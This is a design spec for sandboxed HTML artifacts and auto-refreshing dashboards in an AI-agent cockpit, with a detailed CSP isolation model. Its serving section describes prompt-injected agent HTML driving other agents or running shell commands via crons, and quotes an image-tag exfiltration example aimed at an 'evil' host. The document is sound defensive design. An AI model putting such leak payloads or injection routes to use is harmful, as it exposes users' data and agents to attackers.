# Artifacts and dashboards — design

## Intent

On claude.ai an answer can be a **page**: a chart, a small app, a report you
open beside the chat. In shadok an agent can only talk (chat), hand over a file
(`SendUserFile` / `shadok-files`), or schedule a prompt (`shadok-scheduler`).
What is missing is the thing in between: a **live page the agent builds once and
the cockpit keeps showing**.

Two uses, one mechanism:

- **Artifact** — a self-contained HTML page an agent publishes: a chart of a
  benchmark, a comparison table, a mock-up, a little calculator. Opened from the
  chat, kept, updatable by the agent (new version, same link).
- **Dashboard** — an artifact whose **data refreshes on a schedule without
  waking the LLM**. The agent writes the page and a data command once; the
  server re-runs the command (cron-style, zero tokens) and the page shows the
  new numbers. That is the scheduler's "check" idea applied to display instead
  of alerting: *an agent can make a cron, or a dashboard*.

Success: a user says *"make me a dashboard of the Google Ads spend per campaign,
refreshed every hour"*; the agent replies with a card, the card opens a page with
a chart, and an hour later the chart moved while the agent's turn count did not.

Out of scope (v1): public / anonymous links, artifacts that talk back to the
agent, real-time (sub-minute) streaming, Markdown documents (the chat already
renders Markdown), multi-file apps with a build step.

## What exists today, and why it is not enough

- `COCKPIT_DENY = ["Artifact"]` (`src/profiles.ts`) removes Claude Code's own
  Artifact tool from every agent: it publishes to claude.ai, i.e. outside the
  cockpit, to an account the cockpit's users may not share. That decision stays.
  This spec is the in-cockpit replacement it never had — today an agent asked
  for "a dashboard" writes an HTML file and hands it over as a download, which
  the user must save and open by hand, and which never updates.
- `GET /download` already serves an agent-delivered file, with
  `nosniff` + a `sandbox` CSP and `attachment` for anything non-image —
  precisely so agent-authored HTML can NEVER run in the cockpit's origin. An
  artifact needs the opposite (the page must run its script) **without** giving
  up that property. That tension is the core of this design (§3).
- Crons (`src/crons.ts`) already know how to run a shell command on a schedule,
  in the channel's directory, with the profile's secrets, without the LLM
  (`runCronCheck`). A dashboard refresh is that same run with a different
  destination for stdout.
- The file-offer registry (`src/files.ts`) + `historyWithOffers` is the
  precedent for "a thing an agent produced over HTTP, stored outside the
  transcript, replayed into the chat on reload". Artifacts follow it.

## Design

### 1. The object

```ts
interface Artifact {
  id: string;            // short random, [a-z0-9]{8} — the URL handle; prefix-resolvable (invariant 17)
  title: string;
  sessionId: string;     // the channel that created it (full id)
  version: number;       // 1, 2, … — bumped on every publish
  createdAt: number;
  updatedAt: number;     // last publish
  data?: {               // present only for a dashboard
    refreshedAt?: number;
    error?: string;      // last refresh failure, shown on the page frame
  };
  refresh?: {            // present only for a dashboard
    schedule: CronSchedule;   // same type and parser as crons (interval / daily)
    command: string;          // prints JSON on stdout
    tz?: string;
    nextRun?: number;
  };
  pinned?: boolean;      // shown in the header's artifact list first
}
```

Storage, per instance like crons and the ledger:
`~/.shadok-ai/artifacts/<instanceKey>/<id>/` with `meta.json`, `v<n>.html`
(the last `MAX_VERSIONS` = 20 kept) and `data.json`. 600 / 700 modes.

Owned by the **instance**, created by a session. Closing the channel does NOT
delete the artifact (a report outlives the agent that wrote it) but DOES stop
its refresh — see §4 for why.

### 2. Agent side — the `shadok-artifacts` skill

Seeded at boot like the others (`seedArtifactsSkill`, `copyFileSync` into
`~/.claude/skills/`, so it reaches already-running agents with no reload).
Authenticates with `x-shadok-session-key` (invariant 33).

```
node scripts/artifact.mjs publish <file.html> --title "…" [--id <id>]   # new, or a new version of <id>
node scripts/artifact.mjs data <id> (--file data.json | --stdin)        # push data once
node scripts/artifact.mjs refresh <id> --schedule 1h --command "<sh>"   # make it a dashboard
node scripts/artifact.mjs refresh <id> --off
node scripts/artifact.mjs list
node scripts/artifact.mjs del <id>
```

Endpoints (all keyed on the session key; refusals name the reason, like
`POST /files`):

- `POST /artifacts` — `{title, html, id?}` → `{id, version, url}`. Updating an
  `id` is allowed only for the session that created it (an agent cannot
  overwrite a sibling's dashboard).
- `PUT /artifacts/:id/data` — JSON body, ≤ `MAX_DATA_BYTES` (2 MB). Must parse.
- `PUT /artifacts/:id/refresh` — `{schedule, command, tz?}` or `{off:true}`.
- `GET /artifacts` — list (also used by the cockpit, browser or key).
- `DELETE /artifacts/:id` — creator session, or a browser (human).

Limits: `MAX_HTML_BYTES` 5 MB per version, `MAX_ARTIFACTS` 200 per instance
(refused out loud past it, never evicted silently).

SKILL.md carries the rules an agent cannot guess:

- The page reads its data from `window.SHADOK_DATA` (injected, §3) — it can make
  **no network request** of its own. Fetch the data in the refresh command, not
  in the page.
- Scripts may come only from the allowlisted CDNs, pinned to an exact version
  (§3), or be inlined.
- The refresh command must print **JSON and nothing else** on stdout; anything
  on stderr or a non-zero exit with stderr marks the dashboard stale (invariant
  16's rule, reused).
- An artifact is for something to **look at**. A file to keep is `shadok-files`;
  a recurring alert is `shadok-scheduler`. Pick one, and say which.

The pilot prompt gets one line: *"need a page, chart or dashboard? use
shadok-artifacts — never Claude Code's Artifact tool (denied here)"*, so the
denial stops being a dead end.

### 3. Serving — running agent HTML without letting it touch the cockpit

The page MUST run script (charts), and it is authored by an agent whose input
may be hostile (a README, a web page, a Telegram message). Run in the cockpit's
origin it could open `/ws` and drive every agent, create a cron, i.e. run a
shell. So it never runs in that origin:

`GET /a/:id[?v=n]` — behind the normal password gate (the cookie is sent: it is
a same-origin navigation or iframe load) — returns the HTML with:

```
Content-Security-Policy:
  sandbox allow-scripts allow-popups allow-popups-to-escape-sandbox;
  default-src 'none';
  script-src 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net;
  style-src 'unsafe-inline' https://fonts.googleapis.com;
  font-src https://fonts.gstatic.com;
  img-src data: blob:;
  connect-src 'none';
  form-action 'none';
  base-uri 'none';
  frame-ancestors 'self'
X-Content-Type-Options: nosniff
Cache-Control: no-store
```

Why each part holds:

- `sandbox` **without** `allow-same-origin` gives the page an **opaque origin**
  even when opened top-level. It cannot read the `sk_auth` cookie, and anything
  it sends to the cockpit carries `Origin: null`, which `originAllowed` already
  refuses (`new URL("null")` throws → false, `src/net.ts`). The WebSocket upgrade
  goes through the same guard. This is the property `/download` gets from
  `attachment`; here we get it while still executing.
- `connect-src 'none'` means no `fetch`/WS/beacon anywhere: the page cannot
  exfiltrate what it displays, and cannot probe the loopback. Data reaches it
  only by injection.
- `img-src data: blob:` closes the classic `<img src=https://evil/?leak=…>`
  side channel; a chart that needs an image inlines it.
- The CDN allowlist mirrors what agents already know from claude.ai artifacts.
  It is the one outbound door (a script URL can carry data in its query string).
  Accepted for v1 because the CDNs are fixed hosts that do not log for an
  attacker; `SHADOK_ARTIFACT_CDN=0` drops it (inline/vendored scripts only) for
  an instance that wants zero egress. Open question: vendor Chart.js/D3 under
  `/vendor/` instead — see "Open questions".

**Data injection.** The server inserts, as the first child of `<head>`:

```html
<script>window.SHADOK_DATA = …; window.SHADOK_META = {id, title, version, refreshedAt};</script>
```

The JSON is serialised with `<`, `>`, `&`, U+2028/9 escaped (it lands inside a
`<script>`), and comes from `data.json`, which was validated as JSON on write.
`'unsafe-inline'` is acceptable here and not in the cockpit, because the whole
document is already agent-controlled and sandboxed: there is nothing for an
injected script to escalate to.

Pure, tested: `artifactCsp(opts)`, `injectArtifactData(html, data, meta)`
(`src/artifacts.ts`), with a test that a `</script>` inside a data string cannot
close the tag.

### 4. Dashboards — the refresh job

A refresh is a cron that writes instead of waking:

- Scheduled by the existing `cronTick`; stored on the artifact (`refresh`), not
  in the crons file — so `schedule.mjs list` stays a list of prompts and the
  dashboard's schedule cannot be deleted from under it by a cron `del`.
- Run through the same machinery as `runCronCheck`: `sh -c`, in the channel's
  directory, with the channel's profile secrets, timeout. The target comes from
  `resolveSessionTarget` (invariant 1) — never `process.cwd()`.
- stdout parsed as JSON → `data.json` atomically, `refreshedAt` set, `error`
  cleared, `artifact-data` broadcast. Not JSON, or stderr+non-zero → keep the
  previous data, set `error`, log one `artifact: <id> …` line. Every run logs one
  line, quiet ones included (invariant 15: "ran, nothing new" and "never ran"
  must differ).
- **Zero tokens, always.** No variant wakes the agent. If the user wants an alert
  too, that is a separate cron with a `check` — two objects, two clear jobs.
- **Tied to the channel.** The refresh needs the channel's directory and
  profile secrets; once the channel is closed `resolveSessionTarget` has no
  answer. Rather than guess a cwd and run with no secrets (and fail at 6am), a
  closed channel turns the refresh off and the page frame says *"refresh stopped:
  the agent that built it was closed"*. The data stays. Re-attaching a refresh to
  another agent is a v2.
- Floor of 5 minutes on `interval` (a refresh more often than that is a
  streaming feature, out of scope).

### 5. Cockpit side

- **In the chat**: a `stream-tool` named `ShadokArtifact` (twin of
  `ShadokFile`, deliberately not spelled like any harness tool) renders an
  artifact card: title, `v3`, "dashboard · refreshed 4 min ago" when relevant,
  **Open** and **↗ new tab**. Replayed on reload by merging the registry into
  `history` by timestamp, as `historyWithOffers` does for files — the card
  names the version published at that point, the link opens the latest.
- **The viewer**: a right-hand panel like the diff panel, holding
  `<iframe src="/a/<id>" sandbox="allow-scripts allow-popups">` (the attribute
  doubles the header; belt and braces). A header bar outside the frame shows
  title, version picker, refreshed-at / error, ↻ reload, ↗ new tab, 📌 pin,
  delete. On `artifact-data` / `artifact-version` for the open id, the frame is
  reloaded (keeps it stateless — postMessage live update is a v2). On a phone
  the panel is full-screen.
- **The list**: a header icon (▦) next to the ledger opens all artifacts of the
  instance — pinned first, then by `updatedAt` — with the creating agent's name
  and a dashboard badge. A per-tab ▦ badge (like ⏰ for crons) is a derived
  field on `GET /channels` (invariant 6: derived, never stored).
- **Telegram**: the card becomes a message with the title and the link. It is
  only useful when the cockpit is reachable from the phone (TLS proxy); the
  message says nothing more than that. A server-side screenshot (Playwright is
  in the image) is a v2.

WS additions (server → client): `artifact` (created / new version,
`{id, title, version, sessionId}`), `artifact-data` (`{id, refreshedAt, error?}`),
`artifact-gone` (`{id}`). Broadcast to every client of the instance, since the
list is instance-wide.

### 6. Who may do what

| Action | Agent (session key) | Browser (human) | Peer `restricted` |
|---|---|---|---|
| publish / new version | its own artifacts | — | — |
| push data / set refresh | its own | — | — |
| view `/a/:id`, list | all | all | its agents' only |
| delete | its own | any | — |
| pin | — | yes | — |

A browser publishing HTML is deliberately absent: the cockpit is not an HTML
host for humans.

## Tests

- `test/artifacts.test.ts` (pure): id resolution by prefix (empty / ambiguous
  refused), version rotation keeps 20, size limits, ownership verdict, CSP string
  contains `sandbox` without `allow-same-origin` and `connect-src 'none'`, data
  injection escapes `</script>` and U+2028, refresh-result classification
  (JSON / not JSON / stderr / timeout).
- Skill test, like the scheduler's: `artifact.mjs` against a fake server.
- **Browser, end to end, on a free port** (CLAUDE.md "Running YOUR build"): an
  artifact whose script tries `fetch("/live")`, `new WebSocket(...)`,
  `document.cookie`, `parent.document` and an `<img src=http://…>` — all must
  fail, with the CSP violations visible in the console capture. tsc and unit
  tests cannot see any of this.
- A dashboard with a 5-minute refresh on a fake command: data changes, the open
  frame reloads, the agent's transcript gains nothing.

## Docs to ship with it

README (feature + skill + endpoints + WS messages), `docs/architecture.md`
(the serving/isolation model), CLAUDE.md (rows for `src/artifacts.ts` and
`context/artifacts-skill/`, protocol additions, and an invariant: *agent HTML is
served sandboxed with an opaque origin and no network; never relax
`allow-same-origin` or `connect-src`*).

## Open questions

1. **CDN or vendored libraries?** CDNs match what models already write and cost
   nothing, but are one egress door and break offline / air-gapped instances.
   Vendoring Chart.js + one table lib under `/vendor/` closes both: a classic
   `<script src>` needs no CORS, so `script-src 'self'` would let a sandboxed
   page load it — to be verified in a browser, since CSP `'self'` in an
   opaque-origin document is exactly the kind of detail that only a real run
   settles. Proposal: CDN in v1, `SHADOK_ARTIFACT_CDN=0` to drop it, vendor if
   the probe confirms.
2. **Should a dashboard survive its agent?** v1 says the data does, the refresh
   does not. If users keep closing agents and losing refreshes, v2 lets the
   refresh carry its own `{cwd, profile}` snapshot — at the cost of a job that
   runs with secrets nobody is watching.
3. **Interactive artifacts** (a button that asks the agent something):
   postMessage to the parent, which shows a confirmation before submitting a
   prompt. Powerful and a prompt-injection channel by construction; v2 at the
   earliest.
